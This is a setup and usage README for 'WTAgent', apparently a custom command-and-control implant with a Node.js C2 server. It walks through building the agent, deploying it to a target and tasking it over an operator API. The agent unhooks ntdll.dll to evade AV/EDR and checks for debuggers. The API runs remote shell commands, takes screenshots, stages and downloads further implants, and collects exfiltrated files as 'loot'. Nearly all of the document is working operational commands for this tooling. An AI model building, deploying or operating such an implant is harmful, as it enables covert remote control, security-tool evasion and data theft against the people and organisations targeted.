# WTAgent — Setup & Usage

## Architecture

```
[Operator browser]
       │
       ├── WATCHTOWER UI  (port 443)   — MeshCentral C2 panel + WTAgent panel
       │                                  calls /op/* on port 8443
       │
       └── wt_c2_server.js (port 8443) — single HTTPS server:
               /wta/*   Agent check-ins (encrypted, no token)
               /op/*    Operator API (Bearer token required)
                        loot/   exfil'd files
                        stage/  files staged for agent download
```

---

## 1. Build the agent (run once per engagement)

```bash
cd WTAgent/
./build.sh --url https://YOUR-C2-IP-OR-DOMAIN:8443
```

This will:
1. Generate TLS cert (`server.key`, `server.crt`) if not present
2. Generate RSA-2048 key pair (`agent_unwrap.key`, `agent_unwrap_pub.pem`) if not present
3. Patch `WTAgent.cs` with the correct C2 URL and RSA public key
4. Compile to `bin/WTAgent.exe`

**If Mono is not installed** (compilation skipped on Linux):
```bash
sudo apt-get install -y mono-mcs mono-complete
./build.sh --url https://YOUR-C2-IP-OR-DOMAIN:8443
```

Or compile on Windows — the patched source is saved to `src/WTAgent_patched.cs`:
```
csc /target:exe /platform:x64 /optimize+ /unsafe ^
    /r:System.Windows.Forms.dll /r:System.Drawing.dll ^
    /out:bin\WTAgent.exe src\WTAgent_patched.cs
```

> **Re-run `build.sh` each time the C2 IP/domain changes.** The URL is baked into the binary.

---

## 2. Start the C2 server

```bash
cd WTAgent/
node wt_c2_server.js --port 8443 --key server.key --cert server.crt
```

On startup the server prints your operator token:
```
[INFO] Operator token : <64-char hex token>
[INFO] Token file     : wt_op_token.txt
```

The token is auto-generated once and saved to `wt_op_token.txt`. Keep it secret.

---

## 3. Connect the WATCHTOWER UI

1. Open the WATCHTOWER web panel
2. Click **⚡ WTAGENT** in the toolbar
3. Click **⚙ CFG** and enter:
   - **C2 API URL**: `https://YOUR-C2-IP:8443`
   - **Operator Token**: paste from `wt_op_token.txt`
4. Click **SAVE** — the panel polls `/op/agents` every 5 seconds

---

## 4. Deploy the agent

Copy `bin/WTAgent.exe` to the target and run it (as the engagement dictates).

The agent will:
1. Check for debuggers — long sleep if detected
2. Unhook `ntdll.dll` (removes AV/EDR user-mode hooks)
3. Generate a fresh AES-256 session key, wrap it with the server RSA key, register
4. Enter beacon loop: check in every `SLEEP_BASE ± SLEEP_JITTER` ms

---

## 5. Operator API reference

All requests require `Authorization: Bearer <token>` header.

```bash
BASE=https://YOUR-C2-IP:8443
TOK=$(cat wt_op_token.txt)

# List agents
curl -sk $BASE/op/agents -H "Authorization: Bearer $TOK"

# Queue shell command
curl -sk -X POST $BASE/op/task/AGENTID \
     -H "Authorization: Bearer $TOK" \
     -H "Content-Type: application/json" \
     -d '{"type":"shell","arg":"whoami /all"}'

# Screenshot
curl -sk -X POST $BASE/op/task/AGENTID \
     -H "Authorization: Bearer $TOK" \
     -d '{"type":"screenshot"}'

# Process list
curl -sk -X POST $BASE/op/task/AGENTID \
     -H "Authorization: Bearer $TOK" \
     -d '{"type":"proclist"}'

# Change sleep interval (ms)
curl -sk -X POST $BASE/op/task/AGENTID \
     -H "Authorization: Bearer $TOK" \
     -d '{"type":"sleep","sleep":15000}'

# Stage a file for agent download
curl -sk -X POST $BASE/op/stage/implant.exe \
     -H "Authorization: Bearer $TOK" \
     --data-binary @implant.exe

# Queue download task (agent writes to %TEMP%)
curl -sk -X POST $BASE/op/task/AGENTID \
     -H "Authorization: Bearer $TOK" \
     -d '{"type":"download","arg":"implant.exe"}'

# List exfil'd files
curl -sk $BASE/op/loot -H "Authorization: Bearer $TOK"

# Get results
curl -sk $BASE/op/results/AGENTID -H "Authorization: Bearer $TOK"

# Kill agent
curl -sk -X POST $BASE/op/task/AGENTID \
     -H "Authorization: Bearer $TOK" \
     -d '{"type":"kill"}'
```

---

## 6. Kill switch

Set a registry key on the target to stop the agent on its next check-in:

```powershell
New-ItemProperty -Path "HKCU:\Software\WTAgent" -Name "kill" -Value 1 -Force
```

---

## Security features

| Feature | Detail |
|---|---|
| **Comms encryption** | AES-256-CBC + HMAC-SHA256 per agent; key wrapped with RSA-2048 OAEP on registration |
| **Agent identification** | Agent ID sent in URL `?id=` parameter — O(1) server lookup, no brute-force |
| **Operator auth** | Bearer token (64-char hex), HTTPS only, token stored in `wt_op_token.txt` |
| **Anti-debug** | IsDebuggerPresent, CheckRemoteDebuggerPresent, NtQuery DebugPort/Flags, timing check |
| **EDR unhooking** | Overwrites `ntdll.dll` in-memory `.text` with clean disk copy on startup |
| **Sleep jitter** | Check-in interval = `SLEEP_BASE ± SLEEP_JITTER` ms (default 5s ± 2s) |
| **Kill switch** | Registry key `HKCU\Software\WTAgent\kill` exits agent on next check-in |
| **Connection backoff** | After 5 consecutive failures, sleeps 60s before retrying |

---

## Deploying on a new server

```bash
# Clone repo / copy WTAgent/ directory
cd WTAgent/
./build.sh --url https://NEW-SERVER-IP:8443
node wt_c2_server.js --port 8443 --key server.key --cert server.crt
```

New TLS certs and RSA keys are generated automatically if not present.
Each server gets its own key pair — agents built for one server won't work on another.
